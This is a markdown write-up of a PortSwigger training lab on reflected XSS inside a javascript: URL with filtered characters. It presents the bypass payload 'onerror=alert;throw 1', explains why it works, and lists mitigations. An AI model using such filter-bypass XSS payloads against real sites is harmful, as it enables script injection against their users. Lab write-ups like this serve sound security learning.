# Lab21 - Reflected XSS Into A JavaScript URL With Some Characters Blocked

## Objective

Exploit a reflected XSS vulnerability where user input is reflected into a:

```html
javascript:
```

URL and certain characters are filtered.

Execute:

```javascript
alert(1)
```

to solve the lab.

---

# Lab Information

| Field | Value |
|---------|---------|
| Category | Reflected XSS |
| Difficulty | Practitioner |
| Context | JavaScript URL |
| Platform | PortSwigger |

---

# Vulnerability Overview

The application places attacker-controlled input inside a:

```html
javascript:
```

URL.

Certain characters and keywords are filtered, making traditional payloads fail.

---

# Analysis

## Step 1

Inspect source.

Observation:

```html
<a href="javascript:...">
```

---

## Step 2

Test common payloads.

Example:

```javascript
alert(1)
```

Blocked.

---

## Step 3

Need Alternative JavaScript Execution

JavaScript allows:

```javascript
throw
```

statements.

---

## Step 4

Use Event Handler

```javascript
onerror
```

is globally available.

---

# Full Payload(s) Used

```javascript
onerror=alert;throw 1
```

---

# Why The Payload Works

Execution:

```javascript
onerror=alert;
throw 1;
```

---

Flow:

```text
onerror Assigned
        ↓
Exception Thrown
        ↓
onerror Triggered
        ↓
alert(1)
```

---

# Personal Analysis & Testing Process

## Initial Problem

Standard:

```javascript
alert(1)
```

blocked.

---

## Key Observation

Application still allows:

```javascript
throw
```

and

```javascript
onerror
```

usage.

---

## Exploitation Strategy

Assign:

```javascript
alert
```

to:

```javascript
onerror
```

and deliberately throw an exception.

---

## Result

```javascript
alert(1)
```

executed.

Lab solved.

---

# Mitigation

Avoid:

```html
javascript:
```

URLs.

Restrict allowed protocols to:

```text
http
https
```

---

# Related Theory

- 27-breaking-out-of-a-javascript-string.md

---

# Key Learnings

- Filter bypasses often rely on JavaScript language features.
- onerror + throw is a powerful technique.
- Blocking keywords alone is ineffective.